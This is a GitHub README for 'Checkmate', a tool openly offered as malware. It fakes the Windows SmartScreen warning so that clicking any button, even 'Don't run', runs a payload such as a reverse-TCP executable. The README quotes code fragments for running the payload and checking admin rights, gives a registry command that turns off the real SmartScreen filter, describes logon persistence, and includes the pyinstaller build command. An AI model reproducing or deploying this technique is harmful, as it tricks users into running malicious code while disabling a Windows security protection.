# Checkmate
payload Execution by Fake Windows SmartScreen with requires Administrator privileges &amp; Turn off real SmartScreen Filter

All options allow for the execution of an execution, and this can be used in a different way, such
as opening a port in a Windows machine, or doing it in a different way. can equate the value
of any option to any malicious activity  want.

https://github.com/S3N4T0R-0X0/Checkmate/assets/121706460/1298f8b3-2fbc-484f-b70e-48add2fd87a5

This exploit allows you to  make payload executeion and create execution of administrator privileges by simulating the Windows Smart Screen by clicking any option in the window such as Don't run or (X) to close the window with stop the real smartscreen filter

1.Payload executeion : def dont_run_action(): = other_command = r'C:\Users\username\ReverseTCP.exe'

2.Administrator privileges : return ctypes.windll.shell32.IsUserAnAdmin()

3.Stop the real smartscreen filter : os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "EnableSmartScreenFilter" /t REG_DWORD /d "0" /f')

4.The registry entry is intended to run the script (sys.argv[0]) every time the user logs in

![IMG-20231218-WA0001](https://github.com/S3N4T0R-0X0/Checkmate/assets/121706460/cc23544e-777f-41f6-bd61-dd0a738e38bd)


There are some differences in Windows Smart Screen version, such as the background colors of the options,
some of which are blue, and the other dimension has a white background. You can control this by modifying
the script. Also, there are some that contain the word “Don’t run” without “Run anyway”

![Screenshot from 2023-12-18 11-37-59](https://github.com/S3N4T0R-0X0/Checkmate/assets/121706460/9f7a8d14-2ebc-4c17-8600-17871d6b0355)

Build: pyinstaller --onefile Checkmate.py

Note:In some cases, after the compiling process, the code responsible for stopping the
Real Windows Smart Screen from working does not work, and in some other cases,
when we run the script without doing a ground compile, it does not work. There are
some cases similar to this. There are flaws in this technique, but I am still working on
the development stages.

![photo_2024-01-03_11-41-41](https://github.com/S3N4T0R-0X0/Checkmate/assets/121706460/0bce57d4-dbe0-4511-91a9-a2aa000fca68)

   
